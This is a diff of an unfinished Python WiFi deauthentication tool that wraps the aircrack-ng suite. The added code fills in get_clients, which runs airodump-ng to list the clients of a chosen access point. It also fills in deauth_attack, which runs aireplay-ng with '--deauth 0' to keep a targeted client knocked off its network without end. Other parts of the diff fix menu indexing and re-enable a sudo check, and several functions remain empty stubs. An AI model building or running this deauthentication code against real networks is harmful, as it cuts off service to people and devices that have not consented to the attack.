@@ -55,12 +55,12 @@ def get_wifi_int():
     else:
         print(f"{green}[+]{reset} The following WiFi interfaces are available:")
         for index, item in enumerate(net_int):
-            print(f"{purple}[{index + 1}]{reset} {cyan}{item}{reset}")
+            print(f"{purple}[{index}]{reset} {cyan}{item}{reset}")
         while True:
             try:
                 choice = int(input(f"\n{yellow}[>]{reset} Please select the interface you want to use for the attack: ").strip())
-                if 1 <= choice <= len(net_int):
-                    print(f"{green}[+] {net_int[choice - 1]} connected.{reset}\n")
+                if 0 <= choice <= len(net_int) - 1:
+                    print(f"{green}[+] {net_int[choice]} connected.{reset}\n")
                     break
                 else:
                     print(f"{red}[!]{reset} Please enter a number that corresponds with the choises available.")
@@ -91,11 +91,12 @@ def set_band_to_monitor(band, inf):
     except Exception as e:
         print(f"{red}[!] Scan failed: {e}{reset}")
 
+#### not finished yet
 def scan_networks(inf):
     """Run airodump-ng to discover networks."""
     try:
         wifi_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (all bands, will be slower)"]
-        print(f"{yellow}[?]{reset} Please select the frequency you want to scan:")
+        print(f"{yellow}[?]{reset} Please select the frequency you want to scan {cyan}(verify that your adapter supports 5GHz if chosen){reset}:")
         for idx, band in enumerate(wifi_bands):
             print(f"{purple}[{idx}]{reset} {cyan}{band}{reset}")
         while True:
@@ -108,6 +109,7 @@ def scan_networks(inf):
                     raise ValueError("Please make a valid selection.")
             except ValueError as e:
                 print(f"{red}[!] {e}{reset}")
+        print(freq)
         print(f"{green}[+] Scanning {wifi_bands[choice]}....{reset}\n")
     except (Exception) as e:
         print(f"{red}[!] Scan networks failed: {e}{reset}")
@@ -116,17 +118,15 @@ def select_target(networks):
     """Display network menu and return user's choice."""
     pass
 
-def get_clients(target_bssid, channel, interface):
-    """Capture clients on target network."""
-    pass
+def get_clients(wifi_ssid, wifi_channel, wifi_name):
+    subprocess.Popen(["airodump-ng", "--bssid", wifi_ssid, "--channel", wifi_channel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
 
 def filter_clients(clients, whitelist):
     """Exclude whitelisted MACs from attack."""
     pass
 
-def deauth_attack(target_bssid, clients, interface):
-    """Run deauth attack on selected clients."""
-    pass
+def deauth_attack(network_mac, target_mac, interface):
+    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])
 
 def restore_managed_mode(inf):
     try:
@@ -146,7 +146,7 @@ def restore_managed_mode(inf):
 def main():
     os.system("clear")
     print(logo)
-    #check_sudo()
+    check_sudo()
     inter = get_wifi_int()
     scan_networks(inter)
 
